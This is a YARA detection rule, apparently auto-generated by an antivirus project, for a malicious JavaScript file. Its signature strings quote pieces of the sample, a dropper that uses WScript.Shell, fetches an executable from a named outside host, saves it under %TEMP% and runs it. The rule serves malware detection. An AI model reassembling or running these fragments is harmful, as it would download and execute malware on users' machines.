rule sig_20160330_63cf8c552e323db94530e0d288ca9245 {
  meta:
    description = "datamaliciousorder - file 20160330_63cf8c552e323db94530e0d288ca9245.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fafe46b9b39b5e0b786cdf15c15a7a67e0b5b402cfa75c51dfabb27c6414e4f5"

  strings:
    $s1  = "function _XZ(_RZ, _ML){_FZ = _FZ * 1; return _RZ - _ML;};" fullword ascii
    $s2  = "var _NS = function _S() {return WScript[_HM](\"WScript\"+\".Shell\");}(), _H0 = 11;" fullword ascii
    $s3  = "if (_ZV[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "function _XD() {return _NS[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"KjwaS1axnsfdzg9k.ex\" + \"e\";};" fullword ascii
    $s5  = "function _YZ(){return _DL + \"\";};" fullword ascii
    $s6  = "_ZV[_WP](\"GET\", \"http://topcarshop.ir/m1kas\", false);" fullword ascii
    $s7  = "function _R() {return ((_YM == true) && (_YM == _BG)) ? 1 : _FZ;};" fullword ascii
    $s8  = "function _OR(_WH){_NS[\"Run\"](_WH, _FZ, _FZ);};" fullword ascii
    $s9  = "var _J0 = new this[\"Date\"]();" fullword ascii
    $s10 = "function _J(){return _HM;};" fullword ascii
    $s11 = "return _XZ(_PM, _A0);" fullword ascii
    $s12 = "function _Z(){return 22;};" fullword ascii
    $s13 = " while (_KC){" fullword ascii
    $s14 = "function _GZ(_T) {var _L = (1, 2, 3, 4, 5, _T); return _L;};" fullword ascii
    $s15 = "function _C()" fullword ascii
    $s16 = "_YM = true; " fullword ascii
    $s17 = "_BG = true; " fullword ascii
    $s18 = "var _YM = false;" fullword ascii
    $s19 = "var _BG = false;" fullword ascii
    $s20 = "} catch(_F){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}